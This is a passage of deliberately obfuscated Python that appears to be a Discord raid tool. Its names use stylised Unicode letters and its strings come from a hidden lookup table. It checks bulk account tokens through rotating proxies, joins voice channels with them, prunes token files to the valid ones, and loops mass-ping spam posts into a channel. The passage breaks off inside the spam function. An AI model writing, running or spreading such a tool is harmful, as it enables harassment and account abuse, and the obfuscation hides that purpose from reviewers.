𝘔𝗠𝘕𝗜𝙈𝙄𝙈𝙄𝘭𝘔𝙉𝘕𝙈𝗡𝘭𝘔𝗠𝘭𝙈𝘐𝙡𝙄𝙉𝙄𝘕𝘕𝙄𝙈𝘕𝘕𝙄𝗹[233], 𝘔𝘔𝘕𝙄𝘔𝘐𝗠𝙄𝘭𝙈𝙉𝙉𝗠𝘕𝙡𝙈𝗠𝗹𝘔𝘐𝗹𝗜𝙉𝘐𝘕𝘕𝗜𝘔𝙉𝙉𝗜𝗹[223]: 𝗠𝘔𝗡𝗜𝘔𝗜𝗠𝘐𝙡𝘔𝘕𝘕𝙈𝘕𝗹𝙈𝗠𝘭𝙈𝘐𝙡𝘐𝘕𝗜𝘕𝙉𝙄𝘔𝗡𝙉𝘐𝘭[234], 𝙈𝗠𝘕𝙄𝘔𝘐𝗠𝙄𝗹𝙈𝙉𝗡𝙈𝗡𝗹𝙈𝗠𝗹𝙈𝗜𝙡𝙄𝘕𝘐𝘕𝘕𝗜𝙈𝙉𝗡𝗜𝘭[224]: 𝘔𝙈𝗡𝘐𝙈𝙄𝗠𝘐𝗹𝗠𝗡𝗡𝘔𝙉𝙡𝗠𝙈𝘭𝙈𝘐𝘭𝘐𝗡𝘐𝗡𝗡𝙄𝘔𝘕𝘕𝙄𝗹[235], 𝙈𝘔𝘕𝘐𝗠𝗜𝘔𝗜𝘭𝘔𝗡𝘕𝙈𝘕𝘭𝗠𝙈𝙡𝘔𝘐𝗹𝙄𝗡𝙄𝙉𝙉𝘐𝗠𝘕𝙉𝙄𝙡[225]: 𝙈𝙈𝗡𝙄𝘔𝙄𝗠𝗜𝘭𝗠𝗡𝗡𝙈𝘕𝙡𝙈𝙈𝙡𝙈𝙄𝗹𝘐𝙉𝗜𝙉𝗡𝘐𝗠𝙉𝗡𝗜𝘭[236], 𝘔𝗠𝗡𝘐𝗠𝙄𝙈𝙄𝗹𝗠𝘕𝗡𝙈𝙉𝘭𝗠𝗠𝙡𝙈𝙄𝗹𝗜𝙉𝙄𝘕𝗡𝗜𝗠𝙉𝙉𝙄𝗹[226]: 𝘔𝙈𝗡𝙄𝙈𝙄𝙈𝗜𝗹𝗠𝙉𝙉𝘔𝙉𝙡𝗠𝗠𝙡𝗠𝙄𝗹𝗜𝗡𝗜𝙉𝘕𝘐𝙈𝗡𝗡𝘐𝗹[237], 𝙈𝙈𝙉𝗜𝗠𝙄𝗠𝗜𝘭𝗠𝗡𝘕𝘔𝗡𝗹𝗠𝘔𝘭𝘔𝗜𝙡𝘐𝗡𝘐𝙉𝗡𝘐𝗠𝙉𝙉𝗜𝙡[227]: 𝗠𝘔𝙉𝘐𝙈𝗜𝗠𝙄𝘭𝗠𝘕𝘕𝗠𝙉𝙡𝗠𝗠𝗹𝙈𝗜𝘭𝗜𝗡𝙄𝙉𝘕𝘐𝙈𝗡𝗡𝙄𝘭[238], 𝗠𝗠𝘕𝘐𝗠𝘐𝗠𝙄𝘭𝘔𝗡𝙉𝙈𝙉𝘭𝗠𝗠𝗹𝘔𝙄𝙡𝙄𝘕𝗜𝗡𝗡𝘐𝘔𝘕𝙉𝙄𝙡[133]: 𝗠𝗠𝙉𝗜𝙈𝗜𝘔𝘐𝗹𝘔𝗡𝗡𝙈𝘕𝙡𝙈𝘔𝘭𝗠𝘐𝗹𝗜𝙉𝘐𝗡𝗡𝗜𝘔𝘕𝙉𝙄𝙡[239], 𝙈𝙈𝗡𝗜𝘔𝙄𝘔𝙄𝘭𝗠𝘕𝗡𝘔𝙉𝗹𝘔𝘔𝘭𝙈𝗜𝗹𝙄𝗡𝙄𝘕𝙉𝘐𝙈𝙉𝘕𝙄𝘭[228]: 𝙈𝗠𝗡𝙄𝙈𝘐𝘔𝘐𝗹𝙈𝘕𝙉𝙈𝗡𝙡𝗠𝗠𝘭𝗠𝗜𝗹𝗜𝙉𝙄𝘕𝗡𝗜𝙈𝘕𝙉𝙄𝙡[240], 𝙈𝗠𝗡𝙄𝘔𝙄𝗠𝗜𝗹𝙈𝗡𝗡𝘔𝗡𝘭𝘔𝗠𝘭𝙈𝘐𝗹𝙄𝘕𝙄𝘕𝘕𝙄𝘔𝗡𝙉𝗜𝗹[134]: 𝙈𝗠𝗡𝙄𝙈𝗜𝗠𝘐𝘭𝙈𝙉𝙉𝗠𝘕𝗹𝙈𝘔𝗹𝙈𝘐𝘭𝗜𝗡𝘐𝙉𝙉𝗜𝗠𝙉𝗡𝗜𝙡[230], 𝗠𝘔𝗡𝘐𝙈𝙄𝘔𝗜𝘭𝙈𝗡𝙉𝗠𝘕𝙡𝗠𝗠𝗹𝙈𝘐𝗹𝘐𝘕𝙄𝗡𝙉𝙄𝘔𝘕𝘕𝘐𝗹[229]: 𝙈𝙈𝙉𝘐𝗠𝗜𝗠𝗜𝙡𝘔𝘕𝗡𝘔𝗡𝗹𝙈𝗠𝗹𝗠𝙄𝗹𝘐𝙉𝘐𝙉𝙉𝙄𝗠𝗡𝙉𝗜𝗹[241], 𝙈𝙈𝗡𝗜𝙈𝗜𝗠𝘐𝘭𝘔𝙉𝗡𝗠𝙉𝗹𝙈𝙈𝗹𝗠𝗜𝗹𝗜𝘕𝘐𝗡𝙉𝗜𝘔𝘕𝗡𝘐𝙡[135]: 𝘔𝗠𝗡𝗜𝘔𝙄𝗠𝘐𝘭𝘔𝘕𝙉𝙈𝙉𝗹𝙈𝙈𝘭𝗠𝗜𝗹𝘐𝘕𝙄𝘕𝗡𝗜𝙈𝘕𝘕𝘐𝘭[242]}

def check_token(token):
    𝗵𝘦𝗮𝘥𝙚𝗿𝘀 = 𝙃𝘦𝘢𝙙𝙚𝗿𝙨(𝘁𝙤𝙠𝙚𝘯)
    try:
        if 𝗽𝙧𝙤𝘹𝙮:
            𝙧𝙚𝙨𝘱𝙤𝙣𝘀𝘦 = 𝗿𝗲𝘲𝘶𝘦𝙨𝘵𝘴.get(𝙈𝙈𝗡𝘐𝗠𝙄𝙈𝗜𝗹𝙈𝘕𝘕𝙈𝗡𝗹𝙈𝗠𝙡𝙈𝗜𝘭𝗜𝗡𝗜𝙉𝙉𝗜𝘔𝘕𝗡𝙄𝗹[243], headers=𝘩𝗲𝗮𝗱𝘦𝘳𝘀, proxy={𝘔𝗠𝗡𝙄𝙈𝘐𝗠𝙄𝘭𝗠𝗡𝗡𝘔𝗡𝙡𝘔𝗠𝘭𝗠𝗜𝘭𝘐𝙉𝗜𝘕𝘕𝙄𝘔𝘕𝘕𝙄𝗹[244]: 𝘔𝗠𝙉𝙄𝘔𝘐𝙈𝘐𝘭𝙈𝘕𝙉𝘔𝙉𝘭𝗠𝙈𝘭𝙈𝗜𝗹𝘐𝙉𝗜𝙉𝘕𝘐𝙈𝗡𝘕𝗜𝘭[246] + 𝙧𝗮𝘯𝗱𝘰𝗺.choice(𝗽𝘳𝗼𝘅𝗶𝗲𝘀), 𝗠𝘔𝗡𝘐𝙈𝗜𝙈𝗜𝘭𝘔𝗡𝗡𝘔𝘕𝙡𝙈𝗠𝙡𝗠𝙄𝗹𝗜𝗡𝙄𝘕𝙉𝘐𝘔𝗡𝗡𝙄𝙡[245]: 𝗠𝘔𝙉𝗜𝗠𝙄𝙈𝗜𝙡𝘔𝙉𝘕𝘔𝙉𝘭𝘔𝗠𝙡𝙈𝙄𝘭𝗜𝘕𝘐𝗡𝗡𝘐𝙈𝙉𝙉𝗜𝘭[246] + 𝗿𝗮𝘯𝘥𝗼𝘮.choice(𝙥𝗿𝘰𝘅𝘪𝙚𝘀)})
        else:
            𝙧𝗲𝘴𝗽𝘰𝘯𝘀𝘦 = 𝘳𝗲𝘲𝘶𝙚𝘴𝙩𝘀.get(𝘔𝗠𝘕𝘐𝗠𝙄𝘔𝙄𝘭𝗠𝙉𝗡𝙈𝗡𝘭𝘔𝙈𝘭𝗠𝗜𝗹𝙄𝗡𝙄𝙉𝗡𝗜𝗠𝘕𝗡𝗜𝗹[243], headers=𝗵𝙚𝙖𝗱𝙚𝘳𝘀)
        𝗱𝘯 = 𝘁𝗼𝗸𝙚𝘯.split(𝗠𝙈𝗡𝘐𝘔𝙄𝙈𝗜𝗹𝗠𝘕𝙉𝙈𝗡𝗹𝘔𝙈𝘭𝙈𝙄𝗹𝙄𝙉𝘐𝘕𝘕𝙄𝗠𝙉𝗡𝘐𝘭[247])
        𝘯𝗻 = 𝗱𝘯[0]
        if 𝙧𝙚𝙨𝘱𝘰𝙣𝘀𝙚.status_code == 200:
            𝙥𝘳𝙞𝗻𝘵(f"{𝗿}{𝙈𝘔𝙉𝙄𝙈𝗜𝙈𝗜𝗹𝙈𝙉𝘕𝙈𝘕𝘭𝙈𝘔𝗹𝘔𝙄𝗹𝘐𝙉𝘐𝙉𝙉𝙄𝘔𝗡𝘕𝙄𝘭[91]}{𝙙𝙖𝙩𝘦𝙩𝗶𝙢𝗲.datetime.now().strftime(f'{𝙜}{𝘔𝙈𝗡𝙄𝗠𝘐𝗠𝗜𝘭𝗠𝙉𝙉𝗠𝙉𝘭𝙈𝗠𝙡𝗠𝗜𝗹𝘐𝗡𝗜𝘕𝙉𝙄𝘔𝙉𝘕𝗜𝙡[92]}{𝙧}')}{𝗠𝗠𝙉𝙄𝗠𝘐𝗠𝙄𝘭𝙈𝘕𝘕𝘔𝙉𝘭𝗠𝗠𝘭𝘔𝗜𝘭𝘐𝗡𝗜𝗡𝘕𝗜𝙈𝘕𝗡𝗜𝗹[93]}{𝙧}{𝙈𝘔𝗡𝘐𝙈𝗜𝘔𝗜𝘭𝘔𝘕𝘕𝗠𝘕𝙡𝙈𝙈𝗹𝗠𝘐𝗹𝙄𝘕𝙄𝗡𝙉𝗜𝗠𝗡𝙉𝙄𝙡[91]}{𝙡𝙘}{𝙈𝙈𝙉𝙄𝙈𝙄𝙈𝘐𝘭𝙈𝘕𝗡𝗠𝙉𝘭𝘔𝗠𝙡𝗠𝘐𝙡𝗜𝗡𝗜𝘕𝙉𝙄𝗠𝗡𝙉𝘐𝗹[248]}{𝘳}{𝙈𝗠𝙉𝗜𝗠𝘐𝙈𝗜𝗹𝙈𝘕𝙉𝙈𝙉𝙡𝗠𝘔𝗹𝘔𝙄𝙡𝙄𝙉𝘐𝗡𝙉𝘐𝗠𝘕𝘕𝙄𝙡[93]}{𝙣𝙣}{𝗴}{𝙈𝘔𝙉𝙄𝙈𝗜𝘔𝘐𝘭𝘔𝗡𝙉𝘔𝘕𝙡𝘔𝙈𝙡𝗠𝙄𝘭𝘐𝙉𝙄𝙉𝙉𝗜𝘔𝘕𝙉𝗜𝘭[249]}")
            return True
        elif 𝘳𝙚𝘴𝘱𝗼𝙣𝘀𝙚.status_code == 403:
            𝗽𝘳𝘪𝘯𝘵(f"{𝘳}{𝘔𝙈𝙉𝘐𝗠𝘐𝘔𝘐𝙡𝗠𝗡𝗡𝙈𝙉𝙡𝗠𝗠𝗹𝗠𝙄𝗹𝘐𝙉𝗜𝘕𝗡𝙄𝗠𝘕𝙉𝘐𝙡[91]}{𝙙𝘢𝘵𝙚𝘁𝙞𝗺𝘦.datetime.now().strftime(f'{𝘨}{𝘔𝙈𝘕𝙄𝘔𝘐𝘔𝗜𝘭𝙈𝘕𝙉𝗠𝙉𝘭𝙈𝙈𝗹𝘔𝙄𝙡𝙄𝘕𝘐𝘕𝙉𝘐𝗠𝘕𝘕𝗜𝙡[92]}{𝗿}')}{𝗠𝗠𝙉𝘐𝗠𝗜𝘔𝘐𝘭𝙈𝙉𝘕𝙈𝘕𝗹𝗠𝘔𝗹𝘔𝘐𝙡𝙄𝘕𝙄𝙉𝘕𝗜𝙈𝘕𝙉𝙄𝙡[93]}{𝙧}{𝙈𝙈𝗡𝗜𝙈𝙄𝘔𝙄𝗹𝘔𝙉𝗡𝘔𝙉𝘭𝘔𝗠𝙡𝘔𝘐𝙡𝘐𝘕𝘐𝙉𝘕𝙄𝘔𝘕𝗡𝗜𝗹[91]}{𝙁𝗼𝗿𝙚.CYAN}{𝘔𝙈𝗡𝗜𝗠𝙄𝘔𝙄𝗹𝙈𝘕𝙉𝙈𝘕𝙡𝗠𝘔𝘭𝙈𝗜𝗹𝙄𝙉𝙄𝙉𝙉𝙄𝙈𝗡𝙉𝗜𝙡[250]}{𝙧}{𝙈𝗠𝙉𝗜𝙈𝗜𝙈𝘐𝘭𝘔𝘕𝙉𝙈𝘕𝙡𝗠𝘔𝙡𝗠𝙄𝙡𝘐𝘕𝘐𝘕𝗡𝙄𝘔𝘕𝘕𝙄𝘭[93]}{𝙣𝙣}{𝙜}{𝘔𝙈𝗡𝘐𝘔𝗜𝘔𝘐𝙡𝗠𝙉𝗡𝙈𝘕𝙡𝗠𝙈𝘭𝙈𝙄𝗹𝙄𝙉𝗜𝙉𝙉𝘐𝙈𝘕𝙉𝘐𝗹[249]}")
            return False
        else:
            𝙥𝙧𝘪𝘯𝙩(f"{𝗿}{𝗠𝙈𝗡𝗜𝗠𝘐𝙈𝗜𝘭𝘔𝙉𝗡𝘔𝙉𝙡𝙈𝘔𝙡𝗠𝙄𝙡𝘐𝘕𝘐𝗡𝗡𝙄𝘔𝙉𝙉𝗜𝘭[91]}{𝙙𝘢𝘵𝙚𝙩𝗶𝙢𝗲.datetime.now().strftime(f'{𝙜}{𝗠𝗠𝗡𝘐𝗠𝘐𝙈𝗜𝘭𝘔𝙉𝘕𝗠𝙉𝘭𝗠𝙈𝙡𝙈𝙄𝗹𝙄𝗡𝘐𝙉𝘕𝘐𝙈𝗡𝗡𝙄𝙡[92]}{𝗿}')}{𝗠𝗠𝘕𝘐𝘔𝗜𝙈𝗜𝙡𝘔𝗡𝘕𝗠𝙉𝘭𝘔𝗠𝗹𝗠𝙄𝙡𝗜𝘕𝘐𝘕𝘕𝗜𝘔𝗡𝗡𝘐𝗹[93]}{𝘳}{𝙈𝙈𝘕𝗜𝗠𝘐𝗠𝘐𝘭𝙈𝘕𝘕𝙈𝙉𝘭𝙈𝙈𝗹𝘔𝙄𝘭𝗜𝘕𝙄𝗡𝗡𝘐𝙈𝙉𝙉𝙄𝘭[91]}{𝙗}{𝘔𝙈𝗡𝙄𝘔𝗜𝗠𝙄𝙡𝗠𝙉𝗡𝙈𝘕𝙡𝙈𝗠𝘭𝗠𝘐𝘭𝘐𝘕𝙄𝗡𝘕𝗜𝙈𝙉𝘕𝙄𝗹[251]}{𝘳}{𝙈𝘔𝙉𝘐𝘔𝘐𝙈𝘐𝗹𝙈𝘕𝗡𝙈𝘕𝙡𝙈𝗠𝗹𝙈𝙄𝗹𝙄𝙉𝗜𝙉𝘕𝗜𝙈𝙉𝙉𝙄𝘭[93]}{𝙣𝘯}{𝙜}{𝙈𝗠𝗡𝗜𝘔𝙄𝙈𝘐𝘭𝘔𝗡𝗡𝘔𝙉𝙡𝙈𝙈𝗹𝙈𝘐𝗹𝘐𝗡𝘐𝗡𝘕𝘐𝗠𝘕𝗡𝘐𝙡[249]}")
            return False
    except:
        pass

def vc_joiner(token, guild, channel):
    𝗱𝙣 = 𝘁𝗼𝙠𝗲𝗻.split(𝘔𝗠𝗡𝗜𝗠𝙄𝙈𝙄𝘭𝗠𝘕𝗡𝙈𝗡𝙡𝗠𝙈𝗹𝙈𝘐𝙡𝙄𝗡𝘐𝗡𝗡𝗜𝘔𝙉𝙉𝘐𝗹[247])
    𝘯𝘯 = 𝙙𝗻[0]
    for _ in 𝘳𝗮𝘯𝘨𝙚(1):
        𝘸𝘴 = 𝘞𝙚𝘣𝗦𝗼𝘤𝗸𝗲𝙩()
        𝙬𝙨.connect(𝗠𝘔𝘕𝙄𝙈𝗜𝗠𝙄𝗹𝗠𝘕𝘕𝘔𝘕𝘭𝘔𝙈𝗹𝘔𝙄𝙡𝙄𝗡𝘐𝗡𝘕𝗜𝗠𝘕𝘕𝗜𝗹[252])
        𝙬𝙨.send(𝗷𝘀𝗼𝗻.dumps({𝗠𝗠𝗡𝘐𝙈𝙄𝘔𝗜𝘭𝙈𝙉𝘕𝙈𝙉𝙡𝙈𝙈𝗹𝙈𝙄𝙡𝗜𝙉𝘐𝗡𝗡𝘐𝘔𝗡𝘕𝘐𝗹[169]: 2, 𝙈𝘔𝗡𝘐𝘔𝗜𝗠𝙄𝘭𝘔𝙉𝘕𝗠𝙉𝙡𝘔𝙈𝘭𝙈𝗜𝗹𝙄𝙉𝗜𝗡𝙉𝙄𝘔𝙉𝗡𝘐𝗹[166]: {𝙈𝘔𝙉𝗜𝙈𝗜𝗠𝗜𝗹𝘔𝘕𝗡𝗠𝙉𝗹𝗠𝗠𝙡𝘔𝙄𝙡𝘐𝘕𝗜𝘕𝗡𝘐𝗠𝙉𝗡𝗜𝙡[253]: 𝘁𝘰𝗸𝗲𝗻, 𝙈𝗠𝘕𝙄𝘔𝘐𝗠𝘐𝙡𝙈𝙉𝗡𝙈𝗡𝙡𝘔𝙈𝙡𝘔𝘐𝘭𝘐𝙉𝗜𝙉𝗡𝗜𝗠𝙉𝙉𝘐𝗹[254]: {𝘔𝙈𝘕𝘐𝘔𝗜𝘔𝗜𝙡𝙈𝘕𝙉𝘔𝗡𝘭𝘔𝘔𝘭𝘔𝗜𝘭𝘐𝗡𝘐𝗡𝙉𝘐𝙈𝙉𝗡𝗜𝗹[255]: 𝗠𝗠𝙉𝗜𝗠𝙄𝙈𝗜𝗹𝗠𝗡𝘕𝙈𝘕𝙡𝗠𝙈𝘭𝗠𝙄𝗹𝘐𝙉𝗜𝗡𝙉𝙄𝗠𝗡𝘕𝙄𝙡[258], 𝙈𝘔𝗡𝘐𝙈𝙄𝗠𝙄𝙡𝙈𝗡𝘕𝘔𝘕𝗹𝘔𝗠𝘭𝘔𝙄𝙡𝘐𝗡𝘐𝙉𝗡𝘐𝙈𝗡𝙉𝙄𝗹[256]: 𝙈𝙈𝗡𝗜𝙈𝗜𝙈𝘐𝘭𝗠𝘕𝗡𝙈𝘕𝙡𝙈𝙈𝗹𝙈𝙄𝗹𝙄𝘕𝙄𝘕𝙉𝘐𝗠𝗡𝙉𝗜𝗹[259], 𝙈𝗠𝙉𝗜𝙈𝙄𝘔𝘐𝗹𝙈𝙉𝗡𝘔𝙉𝙡𝘔𝘔𝗹𝙈𝗜𝙡𝗜𝙉𝘐𝘕𝙉𝘐𝘔𝙉𝙉𝘐𝙡[257]: 𝘔𝘔𝗡𝘐𝘔𝘐𝙈𝘐𝘭𝙈𝘕𝗡𝘔𝗡𝙡𝘔𝘔𝙡𝘔𝗜𝗹𝘐𝙉𝗜𝘕𝗡𝙄𝙈𝗡𝙉𝘐𝗹[260]}}}))
        𝙬𝘴.send(𝗷𝘴𝙤𝙣.dumps({𝘔𝘔𝘕𝙄𝙈𝗜𝙈𝗜𝘭𝘔𝙉𝙉𝗠𝗡𝙡𝗠𝗠𝙡𝘔𝙄𝘭𝗜𝗡𝗜𝘕𝗡𝗜𝘔𝙉𝗡𝙄𝘭[169]: 4, 𝗠𝘔𝙉𝘐𝙈𝗜𝘔𝗜𝘭𝘔𝘕𝙉𝘔𝙉𝗹𝙈𝙈𝘭𝘔𝘐𝗹𝗜𝘕𝗜𝗡𝗡𝘐𝗠𝗡𝗡𝘐𝗹[166]: {𝘔𝘔𝘕𝙄𝙈𝗜𝙈𝘐𝙡𝘔𝘕𝗡𝗠𝗡𝗹𝗠𝘔𝘭𝗠𝘐𝗹𝘐𝙉𝙄𝗡𝙉𝘐𝗠𝙉𝗡𝘐𝗹[161]: 𝗴𝘂𝙞𝙡𝘥, 𝙈𝗠𝗡𝘐𝙈𝘐𝘔𝗜𝘭𝘔𝘕𝙉𝙈𝙉𝗹𝙈𝘔𝘭𝘔𝗜𝗹𝙄𝘕𝘐𝗡𝙉𝙄𝗠𝗡𝗡𝗜𝘭[261]: 𝙘𝙝𝙖𝗻𝗻𝘦𝘭, 𝗠𝙈𝙉𝗜𝘔𝘐𝘔𝘐𝙡𝙈𝗡𝗡𝙈𝙉𝗹𝗠𝗠𝘭𝘔𝘐𝙡𝙄𝗡𝙄𝙉𝘕𝙄𝗠𝘕𝙉𝙄𝗹[262]: False, 𝘔𝘔𝗡𝙄𝘔𝘐𝗠𝗜𝙡𝘔𝘕𝗡𝘔𝘕𝙡𝙈𝙈𝙡𝗠𝙄𝗹𝘐𝗡𝗜𝙉𝙉𝘐𝙈𝘕𝘕𝗜𝙡[263]: False}}))
        𝗽𝘳𝙞𝘯𝘁(f"{𝘳}{𝙈𝘔𝘕𝘐𝘔𝙄𝙈𝙄𝘭𝙈𝘕𝙉𝘔𝘕𝘭𝗠𝗠𝘭𝙈𝘐𝙡𝗜𝗡𝗜𝗡𝗡𝙄𝗠𝘕𝙉𝙄𝙡[91]}{𝗱𝙖𝘁𝗲𝙩𝙞𝙢𝙚.datetime.now().strftime(f'{𝘨}{𝘔𝘔𝘕𝘐𝘔𝙄𝙈𝙄𝘭𝘔𝗡𝗡𝙈𝘕𝙡𝙈𝘔𝙡𝗠𝗜𝘭𝗜𝗡𝙄𝘕𝗡𝗜𝙈𝗡𝙉𝗜𝗹[92]}{𝘳}')}{𝗠𝙈𝙉𝗜𝘔𝘐𝙈𝗜𝘭𝗠𝗡𝗡𝙈𝙉𝘭𝘔𝙈𝘭𝗠𝙄𝘭𝗜𝙉𝘐𝙉𝘕𝗜𝗠𝗡𝗡𝘐𝙡[93]}{𝘳}{𝙈𝘔𝘕𝘐𝙈𝘐𝙈𝘐𝙡𝗠𝗡𝙉𝙈𝗡𝙡𝘔𝘔𝘭𝙈𝘐𝗹𝗜𝙉𝙄𝙉𝗡𝘐𝗠𝗡𝙉𝘐𝙡[91]}{𝗹𝗰}{𝗠𝙈𝗡𝗜𝙈𝙄𝙈𝘐𝘭𝗠𝗡𝗡𝙈𝙉𝗹𝘔𝗠𝗹𝗠𝙄𝙡𝙄𝙉𝙄𝙉𝙉𝗜𝗠𝙉𝙉𝘐𝗹[264]}{𝙧}{𝗠𝗠𝙉𝘐𝗠𝘐𝙈𝗜𝗹𝗠𝗡𝗡𝗠𝙉𝙡𝘔𝘔𝘭𝘔𝘐𝙡𝗜𝙉𝘐𝙉𝙉𝘐𝗠𝙉𝘕𝙄𝘭[93]}{𝗻𝙣}{𝙜}{𝗠𝙈𝙉𝗜𝘔𝘐𝙈𝘐𝙡𝙈𝗡𝙉𝙈𝙉𝙡𝙈𝗠𝘭𝘔𝙄𝙡𝗜𝗡𝗜𝙉𝘕𝘐𝗠𝙉𝘕𝘐𝗹[249]}")

def save_tokens(file_path):
    𝘷𝗮𝙡𝙞𝙙_𝘁𝗼𝙠𝙚𝗻𝙨 = 0
    𝘁𝘰𝗸𝙚𝗻𝘴_𝘷𝗮𝗹𝗶𝙙 = []
    𝙩𝘰𝘬𝙚𝙣𝘴 = 𝘰𝙥𝘦𝗻(𝘧𝘪𝙡𝘦_𝗽𝗮𝙩𝘩, 𝗠𝘔𝗡𝗜𝙈𝙄𝘔𝙄𝙡𝙈𝙉𝙉𝗠𝗡𝘭𝘔𝗠𝘭𝗠𝘐𝗹𝙄𝗡𝗜𝗡𝘕𝘐𝗠𝙉𝙉𝗜𝗹[30]).read().splitlines()
    for 𝘵𝗼𝗸𝙚𝘯 in 𝘵𝘰𝗸𝗲𝙣𝘴:
        if 𝗰𝘩𝗲𝗰𝘬_𝘁𝗼𝗸𝙚𝗻(𝘁𝘰𝘬𝗲𝗻):
            𝘃𝙖𝗹𝘪𝗱_𝘁𝙤𝙠𝙚𝙣𝘀 += 1
            𝘁𝘰𝘬𝗲𝙣𝙨_𝘃𝗮𝗹𝙞𝙙.append(𝘵𝘰𝗸𝘦𝘯)
    with 𝘰𝘱𝘦𝙣(𝗳𝘪𝘭𝘦_𝙥𝘢𝘵𝙝, 𝘔𝘔𝙉𝗜𝗠𝗜𝘔𝗜𝙡𝘔𝘕𝗡𝙈𝘕𝙡𝙈𝙈𝗹𝘔𝘐𝙡𝙄𝗡𝗜𝗡𝙉𝙄𝗠𝗡𝗡𝘐𝗹[213]) as 𝘧:
        𝘧.truncate(0)
    with 𝙤𝗽𝗲𝘯(𝗳𝙞𝘭𝘦_𝘱𝘢𝘁𝘩, 𝘔𝘔𝗡𝘐𝗠𝗜𝘔𝗜𝘭𝙈𝗡𝘕𝙈𝙉𝙡𝘔𝗠𝗹𝙈𝙄𝙡𝙄𝘕𝘐𝘕𝙉𝙄𝘔𝗡𝙉𝗜𝘭[215]) as 𝘧:
        for 𝘵𝙤𝗸𝘦𝗻 in 𝘁𝗼𝙠𝘦𝘯𝙨_𝘃𝙖𝙡𝗶𝙙:
            𝙛.write(𝘁𝗼𝙠𝗲𝘯 + 𝗠𝘔𝗡𝘐𝙈𝙄𝘔𝘐𝙡𝙈𝗡𝗡𝘔𝙉𝙡𝘔𝗠𝗹𝙈𝘐𝘭𝗜𝙉𝗜𝗡𝗡𝙄𝗠𝙉𝙉𝙄𝗹[63])

def massping(token, channel, message, delay, pings):
    𝘩𝙚𝗮𝙙𝗲𝙧𝙨 = 𝙃𝘦𝘢𝗱𝗲𝘳𝘴(𝘵𝙤𝗸𝗲𝗻)
    while True:
        𝘥𝘯 = 𝘵𝗼𝘬𝗲𝗻.split(𝘔𝙈𝙉𝗜𝗠𝗜𝘔𝘐𝙡𝙈𝙉𝗡𝘔𝙉𝙡𝘔𝙈𝘭𝙈𝙄𝗹𝙄𝙉𝙄𝙉𝘕𝙄𝙈𝗡𝗡𝗜𝙡[247])
        𝙣𝙣 = 𝗱𝗻[0]
        𝘥𝘢𝘁𝗮 = {𝘔𝙈𝗡𝙄𝙈𝗜𝙈𝘐𝗹𝗠𝘕𝙉𝙈𝗡𝘭𝗠𝘔𝘭𝙈𝙄𝙡𝙄𝙉𝗜𝗡𝘕𝘐𝘔𝗡𝙉𝙄𝗹[265]: f'{𝗺𝙚𝘴𝘴𝗮𝘨𝗲}{𝙈𝘔𝘕𝗜𝘔𝘐𝘔𝘐𝙡𝗠𝙉𝗡𝙈𝘕𝗹𝗠𝗠𝗹𝘔𝙄𝘭𝗜𝙉𝗜𝗡𝘕𝗜𝙈𝙉𝘕𝘐𝗹[98]}{𝗴𝙚𝙩𝘳𝙖𝗻𝗱𝙤𝙢𝘪𝗱𝙨(𝙩5𝘭_𝙡3𝗣𝙎𝙟𝙄𝘳𝗫𝙃𝘓𝗟𝙥𝗜𝘻𝘟𝘳𝘆𝘰𝗩𝘡1𝙔𝗝𝗶𝘳𝘈_𝙭.mro()[10](𝘱𝙞𝗻𝗴𝙨))}'}
        𝙨𝗹𝗲𝘦𝙥(𝙙𝗲𝗹𝗮𝘺)
        if 𝙥𝙧𝙤𝙭𝘆:
            𝙧𝘳 = 𝘳𝘦𝗾𝘶𝙚𝘀𝙩𝙨.post(f'{𝙈𝘔𝘕𝘐𝘔𝘐𝗠𝗜𝙡𝗠𝗡𝗡𝙈𝘕𝙡𝙈𝘔𝘭𝘔𝘐𝙡𝗜𝘕𝙄𝘕𝙉𝙄𝗠𝗡𝘕𝙄𝗹[266]}{𝗰𝙝𝘢𝙣𝗻𝗲𝙡}{𝗠𝗠𝘕𝙄𝘔𝙄𝗠𝘐𝙡𝗠𝗡𝘕𝙈𝘕𝙡𝙈𝗠𝗹𝗠𝙄𝗹𝙄𝙉𝙄𝗡𝙉𝘐𝘔𝗡𝗡𝙄𝘭[267]}', headers=𝙝𝙚𝙖𝗱𝘦𝙧𝘴, json=𝗱𝙖𝘵𝘢, proxy={𝘔𝗠𝘕𝘐𝗠𝙄𝙈𝗜𝘭𝙈𝘕𝘕𝘔𝗡𝘭𝗠𝗠𝙡𝘔𝘐𝘭𝗜𝙉𝙄𝘕𝙉𝗜𝙈𝙉𝗡𝙄𝗹[244]: 𝙈𝗠𝗡𝘐𝘔𝘐𝙈𝘐𝙡𝙈𝘕𝙉𝘔𝗡𝘭𝗠𝗠𝙡𝙈𝘐𝘭𝘐𝗡𝙄𝙉𝙉𝙄𝘔𝗡𝙉𝗜𝘭[246] + 𝙧𝗮𝘯𝗱𝗼𝘮.choice(𝘱𝙧𝙤𝘅𝙞𝗲𝙨), 𝙈𝙈𝗡𝗜𝘔𝗜𝘔𝘐𝘭𝙈𝘕𝗡𝘔𝘕𝗹𝘔𝗠𝙡𝗠𝘐𝘭𝗜𝗡𝙄𝗡𝙉𝘐𝙈𝗡𝘕𝘐𝗹[245]: 𝙈𝗠𝙉𝗜𝙈𝙄𝘔𝙄𝗹𝙈𝘕𝗡𝙈𝙉𝙡𝘔𝗠𝙡𝘔𝗜𝗹𝙄𝗡𝘐𝘕𝘕𝗜𝗠𝘕𝗡𝙄𝗹[246] + 𝘳𝙖𝘯𝙙𝙤𝗺.choice(𝙥𝘳𝗼𝙭𝘪𝘦𝘀)})
        else:
            𝙧𝘳 = 𝗿𝙚𝙦𝙪𝙚𝙨𝙩𝘴.post(f'{𝗠𝙈𝙉𝗜𝘔𝘐𝙈𝘐𝗹𝗠𝗡𝙉𝗠𝘕𝙡𝗠𝗠𝘭𝙈𝘐𝘭𝗜𝘕𝗜𝘕𝙉𝙄𝗠𝘕𝗡𝙄𝗹[266]}{𝘤𝘩𝙖𝗻𝙣𝘦𝘭}{𝘔𝗠𝗡𝙄𝗠𝙄𝗠𝗜𝗹𝙈𝙉𝗡𝗠𝗡𝗹𝘔𝘔𝙡𝗠𝙄𝘭𝘐𝙉𝗜𝙉𝙉𝗜𝗠𝘕𝘕𝘐𝙡[267]}', headers=𝘩𝙚𝙖𝙙𝘦𝘳𝘴, json=𝘥𝘢𝘵𝗮)
        if 𝘳𝘳.status_code == 200:
